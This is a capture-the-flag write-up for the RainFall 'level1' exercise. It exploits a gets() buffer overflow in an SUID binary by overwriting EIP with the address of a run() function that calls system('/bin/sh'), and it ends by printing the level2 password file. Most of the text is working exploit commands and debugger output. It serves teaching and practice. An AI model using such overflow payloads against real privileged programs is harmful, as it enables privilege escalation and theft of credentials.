After running the command `ls -l level1`, we observe the following output:

```
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
```

From this output, we can see that the binary `level1` is set with **SUID (Set User ID)** and **SGID (Set Group ID)** permissions. This means:

- The `s` in the owner (`rws`) and group (`r-s`) permission bits indicates that the program will run with the privileges of its owner (`level2`) and group (`users`), regardless of who executes it.
- In other words, when any user runs this program, it will execute as if it were run by the `level2` user.


### Debugging with GDB  

Now, let's debug the binary using GDB:  
```bash
gdb level1  
b main  
disassemble  
```

**Output:**  
```
Dump of assembler code for function main:  
   0x08048480 <+0>:   push   ebp  
   0x08048481 <+1>:   mov    ebp,esp  
=> 0x08048483 <+3>:   and    esp,0xfffffff0  
   0x08048486 <+6>:   sub    esp,0x50  
   0x08048489 <+9>:   lea    eax,[esp+0x10]  
   0x0804848d <+13>:  mov    DWORD PTR [esp],eax  
   0x08048490 <+16>:  call   0x8048340 <gets@plt>  
   0x08048495 <+21>:  leave  
   0x08048496 <+22>:  ret    
End of assembler dump.  
```

Now we analyze the assembly, and we can see that the function `gets` is called at:  
```
0x08048490 <+16>: call 0x8048340 <gets@plt>
```
Since `gets` is vulnerable to buffer overflow, we can exploit this.  

### Finding the Buffer Offset  

To make our exploitation easier, we use PEDA (Python Exploit Development Assistance for GDB) to determine the buffer offset. After multiple attempts, we found that **76 bytes** overwrite the saved EIP. We can verify this by injecting 76 "A" characters followed by "BBBB" (hex `0x42424242`):  

```bash
gdb-peda$ run < <(python -c 'print("A"*76+"B"*4)')
```

**Register output:**  
```
[----------------------------------registers-----------------------------------]  
EAX: 0xbffff6f0 ('A' <repeats 76 times>, "BBBB")  
EBX: 0xb7fd0ff4 --> 0x1a4d7c  
ECX: 0xb7fd28c4 --> 0x0  
EDX: 0xbffff6f0 ('A' <repeats 76 times>, "BBBB")  
ESI: 0x0  
EDI: 0x0  
EBP: 0x41414141 ('AAAA')  
ESP: 0xbffff740 --> 0x0  
EIP: 0x42424242 ('BBBB')  
```

As we can see, the `EIP` register has been successfully overwritten with `0x42424242` (`"BBBB"`), confirming that the buffer overflow is working as expected.  



let's try use objdump to get more inforamtion about binary
```
 objdump -Mintel -D level1 > obj
```

After examining the output in the object file, we see that my binary contains two functions: main and run.
```
08048444 <run>:
 8048444:	55                   	push   ebp
 8048445:	89 e5                	mov    ebp,esp
 8048447:	83 ec 18             	sub    esp,0x18
 804844a:	a1 c0 97 04 08       	mov    eax,ds:0x80497c0
 804844f:	89 c2                	mov    edx,eax
 8048451:	b8 70 85 04 08       	mov    eax,0x8048570
 8048456:	89 54 24 0c          	mov    DWORD PTR [esp+0xc],edx
 804845a:	c7 44 24 08 13 00 00 	mov    DWORD PTR [esp+0x8],0x13
 8048461:	00 
 8048462:	c7 44 24 04 01 00 00 	mov    DWORD PTR [esp+0x4],0x1
 8048469:	00 
 804846a:	89 04 24             	mov    DWORD PTR [esp],eax
 804846d:	e8 de fe ff ff       	call   8048350 <fwrite@plt>
 8048472:	c7 04 24 84 85 04 08 	mov    DWORD PTR [esp],0x8048584
 8048479:	e8 e2 fe ff ff       	call   8048360 <system@plt>
 804847e:	c9                   	leave  
 804847f:	c3                   	ret    

08048480 <main>:
 8048480:	55                   	push   ebp
 8048481:	89 e5                	mov    ebp,esp
 8048483:	83 e4 f0             	and    esp,0xfffffff0
 8048486:	83 ec 50             	sub    esp,0x50
 8048489:	8d 44 24 10          	lea    eax,[esp+0x10]
 804848d:	89 04 24             	mov    DWORD PTR [esp],eax
 8048490:	e8 ab fe ff ff       	call   8048340 <gets@plt>
 8048495:	c9                   	leave  
 8048496:	c3                   	ret    
 8048497:	90                   	nop
 8048498:	90                   	nop
 8048499:	90                   	nop
 804849a:	90                   	nop
 804849b:	90                   	nop
 804849c:	90                   	nop
 804849d:	90                   	nop
 804849e:	90                   	nop
 804849f:	90                   	nop
```
The `run` function calls `system`:

```
8048472: c7 04 24 84 85 04 08   mov    DWORD PTR [esp], 0x8048584
8048479: e8 e2 fe ff ff        call   8048360 <system@plt>
```

Before calling `system`, the address `0x8048584` is moved into memory, which points to `/bin/sh`:

```
find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 3 results, display max 3 items:
** level1 : 0x8048584 ("/bin/sh")
level1 : 0x8049584 ("/bin/sh")
libc : 0xb7f8cc58 ("/bin/sh")
```

With this information, we can create the following payload:

```
[offset of buffer overflow] "A" * 76 + "\x44\x84\x04\x08" [address of run]
```

Running this payload:

```
level1@RainFall:~$ python -c 'print("A"*76 +"\x44\x84\x04\x08")' | ./level1
Good... Wait what?
Segmentation fault (core dumped)
```

However, this doesn't work. We see the sentence printed from the `run` function, and then a segmentation fault occurs. After debugging, we found that when `system("/bin/sh")` is called inside `run()`, it launches a new shell within the program (`level1`). This shell does not find stdin and closes immediately. 

To fix this, we need to keep stdin open. So we modify our approach and try this:

```
level1@RainFall:~$ (python -c 'print("A"*76 +"\x44\x84\x04\x08")'; cat) | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
